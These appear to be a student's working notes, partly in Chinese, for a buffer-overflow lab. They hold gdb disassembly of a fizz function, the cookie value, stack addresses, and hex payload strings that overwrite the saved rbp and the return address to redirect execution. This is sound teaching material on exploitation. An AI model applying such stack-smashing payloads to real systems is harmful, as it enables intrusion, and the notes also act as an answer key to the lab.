修改先，跳到fizz

fizz:
0x0000000000401413 <+0>:     f3 0f 1e fa     endbr64
0x0000000000401417 <+4>:     55      push   rbp
0x0000000000401418 <+5>:     48 89 e5        mov    rbp,rsp
0x000000000040141b <+8>:     48 83 ec 10     sub    rsp,0x10
0x000000000040141f <+12>:    89 7d fc        mov    DWORD PTR [rbp-0x4],edi

154         if (val == cookie) {
0x0000000000401422 <+15>:    8b 05 20 2d 00 00       mov    eax,DWORD PTR [rip+0x2d20]        # 0x404148 <cookie>
0x0000000000401428 <+21>:    39 45 fc        cmp    DWORD PTR [rbp-0x4],eax
0x000000000040142b <+24>:    75 25   jne    0x401452 <fizz+63>

155             printf("Fizz!: You called fizz(0x%x)\n", val);
0x000000000040142d <+26>:    8b 45 fc        mov    eax,DWORD PTR [rbp-0x4]
0x0000000000401430 <+29>:    89 c6   mov    esi,eax
0x0000000000401432 <+31>:    48 8d 05 f8 0b 00 00    lea    rax,[rip+0xbf8]        #
0x402031
0x0000000000401439 <+38>:    48 89 c7        mov    rdi,rax
0x000000000040143c <+41>:    b8 00 00 00 00  mov    eax,0x0
0x0000000000401441 <+46>:    e8 6a fd ff ff  call   0x4011b0 <printf@plt>

156             validate(1);
0x0000000000401446 <+51>:    bf 01 00 00 00  mov    edi,0x1
0x000000000040144b <+56>:    e8 7f 09 00 00  call   0x401dcf <validate>
0x0000000000401450 <+61>:    eb 19   jmp    0x40146b <fizz+88>

157
158         } else
159             printf("Misfire: You called fizz(0x%x)\n", val);
0x0000000000401452 <+63>:    8b 45 fc        mov    eax,DWORD PTR [rbp-0x4]
0x0000000000401455 <+66>:    89 c6   mov    esi,eax
0x0000000000401457 <+68>:    48 8d 05 f2 0b 00 00    lea    rax,[rip+0xbf2]        #
0x402050
0x000000000040145e <+75>:    48 89 c7        mov    rdi,rax
0x0000000000401461 <+78>:    b8 00 00 00 00  mov    eax,0x0
0x0000000000401466 <+83>:    e8 45 fd ff ff  call   0x4011b0 <printf@plt>

160         exit(0);
0x000000000040146b <+88>:    bf 00 00 00 00  mov    edi,0x0
0x0000000000401470 <+93>:    e8 db fd ff ff  call   0x401250 <exit@plt>
cookie 0x404148 : 0x00 00 00 00 0c 0d 7d c3 = 202,210,755

rbp = 0x7fffffffdff8
rbp-0x4 = 0x7fffffffdff4
rsp = 0x7fffffffdfe8

可以控制rbp的值

test:
    rbpp = 30 e0 ff ff ff 7f 00 00

cookie 0x404148:
rbp = 0x000000000040414c

&level = 0x7fffffffe028

28 + 4 = 2c

当把rbp-4指向level时，仍然报错。故可知不是简单地判断栈帧和地址的关系，应该还要判断指令的地址？

ans1:
aa aa aa aa aa aa aa aa 27 8d e0 f7 ff 7f 00 00 00 00 00 00 00 00 00 00 2c e0 ff ff ff 7f 00 00 4c 41 40 00 00 00 00 00 2d 14 40 00 00 00 00 00

c3 7d 0d 0c aa aa aa aa 27 8d e0 f7 ff 7f 00 00 00 00 00 00 00 00 00 00 2c e0 ff ff ff 7f 00 00 74 dd ff ff ff 7f 00 00 f6 12 40 00 00 00 00 00